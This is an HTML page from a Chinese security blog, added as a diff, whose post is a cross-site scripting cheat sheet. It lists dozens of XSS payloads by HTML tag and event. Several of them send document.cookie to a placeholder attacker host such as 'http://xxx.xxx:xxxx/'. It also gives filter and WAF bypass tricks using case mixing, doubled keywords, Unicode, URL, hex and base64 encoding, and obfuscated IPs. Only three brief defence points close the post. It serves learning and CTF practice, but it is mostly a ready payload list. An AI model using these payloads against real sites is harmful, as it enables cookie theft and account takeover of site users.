@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>xss | Secfeng</title>
+  <meta name="keywords" content=" xss ">
+  <meta name="description" content="xss | Secfeng">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:site_name" content="Secfeng">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-05T11:53:12.000Z">
+<meta property="article:modified_time" content="2023-03-28T14:09:40.008Z">
+<meta property="article:author" content="Secfeng">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Secfeng</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/secfeng"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(16)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="16">
+<input type="hidden" id="yelog_site_word_count" value="38.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>buuctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>laravel</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>rce</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>yii</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/23/ssrf(ctfshow)/"
+           data-tag="ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf(ctfshow)">ssrf(ctfshow)</span>
+            <span class="post-date" title="2023-08-23 09:32:37">2023/08/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/16/xss(ctfshow)/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss(ctfshow)">xss(ctfshow)</span>
+            <span class="post-date" title="2023-08-16 09:00:57">2023/08/16</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/08/03/buuctf/"
+           data-tag="buuctf"
+           data-author="" >
+            <span class="post-title" title="buuctf">buuctf</span>
+            <span class="post-date" title="2023-08-03 15:39:34">2023/08/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI模板注入">SSTI模板注入</span>
+            <span class="post-date" title="2023-07-25 16:51:43">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"
+           data-tag="ssti"
+           data-author="" >
+            <span class="post-title" title="SSTI注入(ctfshow)">SSTI注入(ctfshow)</span>
+            <span class="post-date" title="2023-07-25 16:30:32">2023/07/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="laravel"
+           data-author="" >
+            <span class="post-title" title="laravel5.7反序列化漏洞复现">laravel5.7反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-30 16:31:25">2023/05/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/29/yii2%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag="yii"
+           data-author="" >
+            <span class="post-title" title="yii2框架反序列化漏洞复现">yii2框架反序列化漏洞复现</span>
+            <span class="post-date" title="2023-05-29 16:22:42">2023/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化">php反序列化</span>
+            <span class="post-date" title="2023-05-27 20:16:39">2023/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php反序列化(ctfshow)">php反序列化(ctfshow)</span>
+            <span class="post-date" title="2023-05-09 20:42:55">2023/05/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含(ctfshow)">文件包含(ctfshow)</span>
+            <span class="post-date" title="2023-04-25 10:39:55">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传(upload-labs)">文件上传(upload-labs)</span>
+            <span class="post-date" title="2023-04-19 14:08:07">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/14/linux%E5%AD%A6%E4%B9%A0/"
+           data-tag="linux"
+           data-author="" >
+            <span class="post-title" title="linux学习">linux学习</span>
+            <span class="post-date" title="2023-04-14 22:24:49">2023/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"
+           data-tag="rce"
+           data-author="" >
+            <span class="post-title" title="命令执行(ctfshow)">命令执行(ctfshow)</span>
+            <span class="post-date" title="2023-04-09 19:52:07">2023/04/09</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php伪协议">php伪协议</span>
+            <span class="post-date" title="2023-04-04 22:21:18">2023/04/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php特性(ctfshow)">php特性(ctfshow)</span>
+            <span class="post-date" title="2023-04-03 15:56:51">2023/04/03</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2023/03/28/xss/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="xss">xss</span>
+            <span class="post-date" title="2023-03-28 20:37:01">2023/03/28</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">xss</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">xss</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-08-20 19:56:55'>2023-03-28 20:37</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:2.5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-text">无过滤情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5"><span class="toc-text">存在过滤情况</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>xss类型：</p>
+<p>​	反射型</p>
+<p>​	存储型</p>
+<p>​	DOM型（document.write、innerHTML、eval）</p>
+<p>注：document.write可以识别Native编码</p>
+<p>同源策略：同协议，同域名，同端口</p>
+<pre><code>标签法：&lt;script&gt;alert(123)&lt;/script&gt;
+伪协议：&lt;a href=javascript:alert(555)&gt;&lt;/a&gt;
+事件法：&lt;a onmousemove=alert(888)&gt;8888&lt;a&gt;
+</code></pre>
+<h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><p>&lt;script&gt;</p>
+<pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;
+&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://xxx.xxx:xxxx/&quot;+document.cookie&lt;/script&gt;  //外带
+&lt;script&gt;window.open(&quot;http://xxx.xxx:xxxx/&quot;+document.cookie)&lt;/script&gt;
+&lt;script&gt;window.location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;
+&lt;script&gt;location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>&lt;img&gt;</p>
+<pre><code>图片加载错误时触发
+&lt;img src=&quot;x&quot; onerror=alert(1)&gt;
+&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;
+鼠标指针移动到元素时触发
+&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;
+鼠标指针移出时触发
+&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;
+</code></pre>
+<p>&lt;a&gt;</p>
+<pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;
+&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;
+&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;
+&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;
+&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;
+&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;
+</code></pre>
+<p>&lt;input&gt;</p>
+<pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;
+竞争焦点，从而触发onblur事件
+&lt;input onfocus=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot; autofocus&gt; //外带
+&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;
+&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;
+&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;
+&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;
+&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
+按下按键时触发
+&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;
+按下按键时触发
+&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;
+松开按键式时触发
+&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;
+</code></pre>
+<p>&lt;from&gt;</p>
+<pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;
+&lt;form action=javascript:alert(&#39;xss&#39;)&gt;
+&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;
+&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;
+&lt;form action=1 onmouseover=alert(&#39;xss)&gt;
+&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;
+&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+</code></pre>
+<p>&lt;iframe&gt;</p>
+<pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
+&lt;iframe onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; //外带
+&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;
+&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)
+</code></pre>
+<p>&lt;svg&gt;</p>
+<pre><code>&lt;svg onload=alert(1)&gt;
+&lt;svg onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;
+</code></pre>
+<p>&lt;body&gt;</p>
+<pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;
+&lt;body onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt; //外带
+利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
+&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+</code></pre>
+<p>&lt;button&gt;</p>
+<pre><code>元素上点击鼠标时触发
+&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;
+</code></pre>
+<p>&lt;p&gt;</p>
+<pre><code>元素上按下鼠标时触发
+&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
+元素上释放鼠标时触发
+&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
+</code></pre>
+<p>&lt;details&gt;</p>
+<pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;
+使用open属性触发ontoggle事件，无需用户去触发
+&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;元素上按下鼠标时触发
+&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
+元素上释放鼠标时触发
+&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;
+</code></pre>
+<p>&lt;select&gt;</p>
+<pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;select onfocus=alert(1) autofocus&gt;
+</code></pre>
+<p>&lt;video&gt;</p>
+<pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+</code></pre>
+<p>&lt;audio&gt;</p>
+<pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<p>&lt;textarea&gt;</p>
+<pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;
+</code></pre>
+<p>&lt;keygen&gt;</p>
+<pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐
+</code></pre>
+<p>&lt;marquee&gt;</p>
+<pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以
+</code></pre>
+<p>&lt;isindex&gt;</p>
+<pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE
+</code></pre>
+<p>利用link远程包含js文件</p>
+<pre><code>在无CSP的情况下才可以
+&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;
+</code></pre>
+<p>javascript伪协议</p>
+<pre><code>&lt;a&gt;标签
+&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;
+&lt;iframe&gt;标签
+&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;
+&lt;img&gt;标签
+&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下
+&lt;form&gt;标签
+&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;
+</code></pre>
+<p>expression属性</p>
+<pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下
+&lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下
+&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下
+</code></pre>
+<p>background属性</p>
+<pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效
+</code></pre>
+<h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><p>过滤空格</p>
+<pre><code>用 / 代替空格
+&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;
+</code></pre>
+<p>过滤关键字</p>
+<pre><code>大小写绕过
+&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;
+双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)
+&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;
+字符拼接(利用eval)
+&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;
+字符拼接(利用top)
+&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)
+</code></pre>
+<p>其他字符混淆</p>
+<pre><code>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
+下面举几个简单的例子
+可利用注释、标签的优先级等
+&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;
+&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;
+&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
+&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;
+</code></pre>
+<p>编码绕过</p>
+<pre><code>Unicode编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;
+url编码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;
+Ascii码绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
+Hex绕过
+&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;
+八进制绕过
+&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;
+base64绕过
+&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;
+</code></pre>
+<p>过滤双引号，单引号</p>
+<pre><code>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号
+&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;
+使用编码绕过，具体看上面列举的例子
+</code></pre>
+<p>过滤括号</p>
+<pre><code>当括号被过滤的时候可以使用throw来绕过
+&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;
+</code></pre>
+<p>过滤url地址</p>
+<pre><code>使用url编码
+&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;
+使用IP
+&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制
+&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制
+&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制
+&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://
+使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)
+使用中文逗号代替英文逗号
+&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//会自动跳转到百度
+</code></pre>
+<p>htmlspecialchars() 函数实体化HTML</p>
+<pre><code>q&#39; onclick=&#39;alert(123)    //没有实体化引号的情况下
+</code></pre>
+<p>注：innerHtml不会执行script和svg标签</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p>
+<p>拓展链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p>
+<p>xss防御：</p>
+<p>​		1、过滤</p>
+<p>​		2、httponly -&gt;让js无法读取到httponly保护的cookie字段（可以找到探针phpinfo）</p>
+<p>​		3、HTML实体化（转义）</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
